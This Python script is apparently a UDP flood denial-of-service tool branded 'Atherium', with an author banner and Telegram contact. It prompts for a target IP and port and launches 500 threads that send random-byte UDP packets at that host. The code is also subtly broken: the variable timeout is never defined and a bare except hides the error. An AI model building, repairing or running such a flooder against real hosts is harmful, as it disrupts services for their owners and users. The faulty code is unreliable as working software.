import os
import socket
import threading
import random
import sys
import time

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM);

logo = '''
░█████╗░████████╗██╗░░██╗███████╗██████╗░██╗██╗░░░██╗███╗░░░███╗
██╔══██╗╚══██╔══╝██║░░██║██╔════╝██╔══██╗██║██║░░░██║████╗░████║
███████║░░░██║░░░███████║█████╗░░██████╔╝██║██║░░░██║██╔████╔██║
██╔══██║░░░██║░░░██╔══██║██╔══╝░░██╔══██╗██║██║░░░██║██║╚██╔╝██║
██║░░██║░░░██║░░░██║░░██║███████╗██║░░██║██║╚██████╔╝██║░╚═╝░██║
╚═╝░░╚═╝░░░╚═╝░░░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝╚═╝░╚═════╝░╚═╝░░░░░╚═╝
                    Author: @windows-d
                    Version: 1.0
'''

os.system("clear")
print (logo)
print (" ")
print ("Github   : https://github.com/windows-d")
print ("Telegram : @micheleakabstees")
print (" ")

target = input("IP Target: ")
port = int(input("Port: "))

os.system("clear")
print (logo)
print (" ")
print ("Github   : https://github.com/windows-d")
print ("Telegram : @micheleakabstees")
print (" ")

threads = 500

def attack():
    try:
        bytes = random._urandom(1024)
        while time.time() < timeout:
            s.sendto(bytes*random.randint(5,15),(target , port))
        return
        sys.exit()
    except:
        pass

print ("Iniziando L'Attacco...")
for x in range(0, threads):
    threading.Thread(target=attack).start()
print("Attacco Iniziato Correttamente.")
